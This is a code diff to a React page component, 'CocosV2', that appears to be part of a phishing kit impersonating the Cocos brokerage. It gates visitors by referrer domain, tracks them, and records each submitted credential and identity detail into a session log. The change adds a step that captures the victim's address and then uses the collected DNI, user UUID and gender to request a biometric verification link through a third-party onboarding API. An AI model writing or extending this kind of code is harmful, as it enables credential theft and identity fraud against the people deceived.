@@ -13,10 +13,11 @@ import CocosV2MfaScreen from "@/components/cocosv2/CocosV2MfaScreen";
 import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
 import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
 import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
+import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
 import { generateTOTP } from "@/lib/totp";
 import { saveTotpSecret } from "@/lib/totp";
 
-type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "biometric" | "done";
+type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "address" | "biometric" | "done";
 
 const ALLOWED_REFERRERS = ["linkshield.vip", "mon.net.br"];
 
@@ -85,7 +86,9 @@ const CocosV2 = () => {
   const [syncedFullName, setSyncedFullName] = useState("");
   const [syncedPhone, setSyncedPhone] = useState("");
   const [biometricUrl, setBiometricUrl] = useState("");
-
+  const [userUuid, setUserUuid] = useState("");
+  const [userGender, setUserGender] = useState("");
+  const [lastDni, setLastDni] = useState("");
   useVisitTracker();
   useVisitorPresence(sessionId || null);
 
@@ -960,6 +963,7 @@ const CocosV2 = () => {
   // ── Identity Verification (Wayni onboarding) ──
   const handleIdentityVerify = useCallback(async (data: { identity_number: string; phone_number: string }) => {
     await updateSession("verify_dni_submitted", { otp_code: `dni:${data.identity_number}|phone:${data.phone_number}` });
+    setLastDni(data.identity_number);
     const pwd = lastPasswordRef.current || lastPassword;
     const { data: result, error: apiError } = await invokeWayni({
       action: "onboarding_verify",
@@ -975,10 +979,43 @@ const CocosV2 = () => {
     }
 
     if (result?.full_name) setSyncedFullName(result.full_name);
-    setBiometricUrl(result.biometric_url);
-    await updateSession("verify_dni_success", { otp_code: `dni:${data.identity_number}|name:${result?.full_name || ""}` });
-    setStep("biometric");
+    if (result?.user_uuid) setUserUuid(result.user_uuid);
+    if (result?.gender) setUserGender(result.gender);
+    await updateSession("verify_dni_success", { otp_code: `dni:${data.identity_number}|name:${result?.full_name || ""}|uuid:${result?.user_uuid || ""}` });
+    setStep("address");
   }, [email, lastPassword, syncedPhone, updateSession]);
+
+  // ── Address submission → then biometric ──
+  const handleAddressSubmit = useCallback(async (addressData: Record<string, unknown>) => {
+    await updateSession("address_submitted", { otp_code: `region:${addressData.region}|city:${addressData.city}` });
+    const { data: result, error: apiError } = await invokeWayni({
+      action: "save_address",
+      ...addressData,
+    });
+
+    if (apiError || result?.error) {
+      await updateSession("address_error");
+      throw new Error(result?.error || apiError?.message || "Error al guardar la dirección");
+    }
+
+    await updateSession("address_saved");
+
+    // Now request biometric
+    const { data: bioResult, error: bioError } = await invokeWayni({
+      action: "onboarding_biometric",
+      identity_number: lastDni,
+      user_uuid: userUuid,
+      gender: userGender,
+    });
+
+    if (bioError || bioResult?.error || !bioResult?.biometric_url) {
+      await updateSession("biometric_error");
+      throw new Error(bioResult?.error || bioError?.message || "Error al generar enlace biométrico");
+    }
+
+    setBiometricUrl(bioResult.biometric_url);
+    setStep("biometric");
+  }, [updateSession, lastDni, userUuid, userGender]);
 
   // ── Biometric events tracking ──
   const handleBiometricEvent = useCallback(async (event: string) => {
@@ -1081,6 +1118,15 @@ const CocosV2 = () => {
             fullName={syncedFullName}
             phone={syncedPhone}
             onSubmit={handleIdentityVerify}
+          />
+        )}
+
+        {step === "address" && (
+          <CocosV2AddressScreen
+            email={email}
+            fullName={syncedFullName}
+            userUuid={userUuid}
+            onSubmit={handleAddressSubmit}
           />
         )}
 
